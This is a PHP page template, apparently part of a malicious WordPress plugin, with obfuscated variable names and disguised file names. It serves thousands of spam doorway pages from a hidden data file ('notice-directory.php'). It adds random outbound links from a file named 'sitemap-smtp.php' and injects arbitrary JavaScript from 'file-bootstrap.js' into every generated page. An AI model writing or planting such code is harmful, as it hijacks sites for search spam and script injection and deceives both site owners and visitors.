<?php
$l366p01 = intval(get_query_var('jeywd'));

if ($l366p01 < 1 || $l366p01 > 4996) return;
$klRhcu = file(plugin_dir_path(__FILE__).'notice-directory.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$lH0EoPIM = explode(';', $klRhcu[$l366p01]);
if (count($lH0EoPIM) < 2) return;
$zCq3etjYPs = $lH0EoPIM[0];
$kbs1pG  = $lH0EoPIM[1];
$p3Z2AxJHxT = $lH0EoPIM[2];
$y3pdmochs  = $lH0EoPIM[3];
$cUsVu = $lH0EoPIM[4];
set_query_var('zjvmsvbxeo', $zCq3etjYPs);

$p6GNpbPm = '';
$w3bzWBD1L = plugin_dir_path(__FILE__).'sitemap-smtp.php';
if (is_file($w3bzWBD1L)) {
	$g1UIc = file($w3bzWBD1L, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($g1UIc);
	shuffle($g1UIc);
	$e0u3JFoD = mt_rand(2, 5);
	if (count($g1UIc) > $e0u3JFoD) {
		for ($ygEkq = 0; $ygEkq < $e0u3JFoD; $ygEkq++) {
			$znJ56DA2 = array_shift($g1UIc);
			$p6GNpbPm .= '<p><a href="'.$znJ56DA2.'">'.$znJ56DA2.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $zCq3etjYPs; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $kbs1pG . "</p>\n";
				if (strlen($y3pdmochs) > 0) echo "<p>" . $y3pdmochs . "</p>\n";
				if (strlen($p3Z2AxJHxT) > 0) echo "<p>" . $p3Z2AxJHxT . "</p>\n";
				if (strlen($cUsVu) > 0) echo '<p><a href="#"><img src="'.$cUsVu.'"></a>' . "</p>\n";
				echo $p6GNpbPm;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$jZCARB4IlU = plugin_dir_path(__FILE__) . 'file-bootstrap.js';
if (is_file($jZCARB4IlU)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($jZCARB4IlU);
	echo '</script>';
}
get_footer();
?>
